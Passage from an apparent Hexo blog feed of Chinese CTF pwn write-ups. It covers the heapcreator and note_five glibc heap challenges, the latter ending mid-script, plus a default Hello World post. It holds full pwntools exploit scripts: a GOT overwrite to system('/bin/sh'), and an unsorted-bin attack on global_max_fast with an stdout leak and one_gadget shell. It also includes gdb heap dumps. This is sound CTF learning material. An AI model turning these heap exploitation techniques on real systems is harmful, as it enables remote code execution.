class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">24</span>gx <span class="number">0x00000000023681a0</span><span class="number">-0x10</span>		<span class="comment">//edit时覆盖victimchunk</span></span><br><span class="line"><span class="number">0x2368190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x23681a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368230</span>:	<span class="number">0x0000000000000110</span>	<span class="number">0x0000000000000130</span></span><br><span class="line"><span class="number">0x2368240</span>:	<span class="number">0x0000000000006262</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里就完成了布局，现在只要free victim_chunk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x0000000002368120-0x10</span><br><span class="line">0x2368110:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x2368120:	0x0000000000000100	0x0000000000020ee1</span><br><span class="line">0x2368130:	0x0000000002368120	0x0000000002368120</span><br><span class="line">0x2368140:	0x0000000002368120	0x0000000002368120</span><br><span class="line">//此时fakechunk的size变了，其实这就是fakesize+victim_size+topchunk_size</span><br></pre></td></tr></table></figure>

<p>这个时候我们在申请一个堆块，并填充一些东西（偏移量在调试中查看）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pad = <span class="string">b&quot;/bin/sh\x00&quot;</span>+ <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x180</span>-<span class="number">0x130</span>-<span class="number">16</span>) +p64(<span class="number">0x21</span>)+p64(<span class="number">50</span>) +p64(free_got)</span><br><span class="line">add(<span class="number">0x200</span>,pad)</span><br></pre></td></tr></table></figure>

<p>新申请的堆块就是从fakechunk开始分配，后面自行调试偏移量</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">elf =ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">Gptr = <span class="number">0x006020A0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,text</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content of heap:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content of heap : &quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	ch(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	ch(<span class="number">4</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&#x27;ssss&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">main_arena = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">offset = <span class="number">0x7f3d1c53cb78</span>-<span class="number">0x7f3d1c178000</span></span><br><span class="line"><span class="comment">#aimed_addr   </span></span><br><span class="line">malloc_hook=main_arena - <span class="number">0x68</span></span><br><span class="line">lib_base = main_arena-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(lib_base))</span><br><span class="line">system_addr= libc.symbols[<span class="string">&#x27;system&#x27;</span>]+lib_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;\xf0&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">heap_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">&quot;bb&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span> * ( <span class="number">0x90</span>)+p64(<span class="number">0x110</span>)+p64(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>)+p64(heap_addr+<span class="number">0x120</span>)*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">pad = <span class="string">b&quot;/bin/sh\x00&quot;</span>+ <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x180</span>-<span class="number">0x130</span>-<span class="number">16</span>) +p64(<span class="number">0x21</span>)+p64(<span class="number">50</span>) +p64(free_got)</span><br><span class="line">add(<span class="number">0x200</span>,pad)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/03/19/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>begin</category>
      </categories>
      <tags>
        <tag>Hello World</tag>
      </tags>
  </entry>
  <entry>
    <title>heap_paradise</title>
    <url>/2022/04/14/heap-paradise/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>note_file</title>
    <url>/2022/04/01/note-five/</url>
    <content><![CDATA[<h1 id="unsortedbin-attack-global-max-fast"><a href="#unsortedbin-attack-global-max-fast" class="headerlink" title="unsortedbin_attack  global_max_fast"></a>unsortedbin_attack  global_max_fast</h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ file note_five </span><br><span class="line">note_five: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">99</span>cce6e83f71ad3fa44410c59cd5a40b4ade1acb, stripped</span><br><span class="line">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ checksec --file=note_five</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/ruan/attack_global_max_fast/note_five&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="主要程序："><a href="#主要程序：" class="headerlink" title="主要程序："></a>主要程序：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;infomation management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. new info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. delete info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_num();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  idx = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    size = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x8F</span> &amp;&amp; size &lt;= <span class="number">0x400</span> )         <span class="comment">// size &gt;fast_max_</span></span><br><span class="line">    &#123;</span><br><span class="line">      heaplist[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      v0 = sizeL;</span><br><span class="line">      sizeL[idx] = size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;size error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_D47</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  idx = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">4</span> || !heaplist[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="type">read_t</span>(heaplist[idx], sizeL[idx], <span class="number">10LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_A70</span><span class="params">(__int64 ptr, <span class="type">signed</span> <span class="type">int</span> size, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; size )							<span class="comment">//offbyone</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )        <span class="comment">// connot input null</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = buf;</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )                            <span class="comment">// a3=&#x27;\n&#x27;</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(ptr + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_DF5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  idx = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( heaplist[idx] )</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)heaplist[idx]);</span><br><span class="line">    heaplist[idx] = <span class="number">0LL</span>;                        <span class="comment">// no uaf</span></span><br><span class="line">    v0 = sizeL;</span><br><span class="line">    sizeL[idx] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>限制了堆块大小，没有输出函数泄露地址，没有UAF。但offbyone</p>
<h2 id="思路：unsortedbins-attack-攻击global-max-fast，将堆块放入fastbins"><a href="#思路：unsortedbins-attack-攻击global-max-fast，将堆块放入fastbins" class="headerlink" title="思路：unsortedbins attack 攻击global_max_fast，将堆块放入fastbins."></a>思路：unsortedbins attack 攻击global_max_fast，将堆块放入fastbins.</h2><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><h2 id="•unsorted-bin-概述"><a href="#•unsorted-bin-概述" class="headerlink" title="•unsorted bin 概述"></a>•unsorted bin 概述</h2><p>•当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中</p>
<p>•释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p>
<p>•当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</p>
<p>•Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即<strong>插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong></p>
<p>•在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中</p>
<p><img src="C:\Users\32644\AppData\Roaming\Typora\typora-user-images\image-20220401163135175.png" alt="image-20220401163135175"></p>
<p>如果我们控制了 bk 的值，我们就能将 unsorted_chunks (av) 写到bk+0x10地址，这是一个很大的值</p>
<h2 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h2><p>1，构造 overlap，实现freechunk的覆盖</p>
<p>2：修改unsorted_chunk的bk,</p>
<p>​        <em>问题，pie保护导致没有地址，没有输出但上述导致地址无法泄露，如何覆盖到global_max_fast?</em></p>
<p>​        </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x56021208d000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">135169</span>, </span><br><span class="line">  fd = <span class="number">0x7fb7435a7b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7fb7435a7b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p &amp;global_max_fast</span><br><span class="line">$<span class="number">1</span> = (<span class="type">size_t</span> *) <span class="number">0x7fb7435a97f8</span> &lt;global_max_fast&gt;</span><br><span class="line">pwndbg&gt; p &amp;main_arena</span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">struct</span> malloc_state *) <span class="number">0x7fb7435a7b20</span> &lt;main_arena&gt;</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最低三字节不会变，末尾第4字节不确定，但是偏移量不变,爆破</p>
<p>•接着利用fastbin attack攻击stdout-0x51处，我们要攻击stdout结构体来泄露libc地址</p>
<p>•stdout-0x51处有一个错位的0xff</p>
<p>•泄露libc之后就用和house of orange一样的技巧来getshell，即伪造stderr的vtable，触发malloc_printerr来getshell</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz</span>):</span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">9999</span></span>):</span><br><span class="line">	<span class="keyword">global</span> p</span><br><span class="line">	<span class="keyword">if</span> host:</span><br><span class="line">		p = remote(host,port)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = process(<span class="string">&quot;./note_five&quot;</span>)</span><br><span class="line">		gdb.attach(p)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0xa8</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x1e8</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">	</span><br><span class="line">	dele(<span class="number">1</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	dele(<span class="number">3</span>)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x1f8</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	edit(<span class="number">1</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x1f0</span>)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">	</span><br><span class="line">	t = <span class="built_in">int</span>(raw_input(<span class="string">&#x27;guest: &#x27;</span>))</span><br><span class="line">	<span class="comment"># t = 8</span></span><br><span class="line">	global_maxfast = (t &lt;&lt; <span class="number">12</span>) | <span class="number">0x7f8</span></span><br><span class="line">	</span><br><span class="line">	stdout = global_maxfast-<span class="number">0x11d8</span></span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">1</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>+p16(global_maxfast-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x1f8</span>)</span><br><span class="line">	edit(<span class="number">2</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x1f8</span>+<span class="string">&#x27;\xf1&#x27;</span>)</span><br><span class="line">	edit(<span class="number">0</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x98</span>+p64(<span class="number">0xf1</span>)+p16(stdout-<span class="number">0x51</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	dele(<span class="number">4</span>)</span><br><span class="line">	</span><br><span class="line">	dele(<span class="number">3</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x2e8</span>)</span><br><span class="line">	edit(<span class="number">3</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0xf1</span>)+<span class="string">&#x27;\xa0\n&#x27;</span>)</span><br><span class="line">	dele(<span class="number">2</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">4</span>,<span class="string">&#x27;A&#x27;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">0x40</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00\n&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	p.recv(<span class="number">0x40</span>)</span><br><span class="line">	</span><br><span class="line">	libc.address = u64(p.recv(<span class="number">8</span>))-<span class="number">0x3c5600</span></span><br><span class="line">	info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">	pause()</span><br><span class="line">	one_gadget = <span class="number">0xf1207</span>+libc.address</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">&#x27;\x00&#x27;</span>+p64(libc.address+<span class="number">0x3c55e0</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x1</span>)+p64(one_gadget)*<span class="number">2</span>+p64(libc.address+<span class="number">0x3c5600</span>-<span class="number">8</span>)</span><br><span class="line">	edit(<span class="number">4</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">	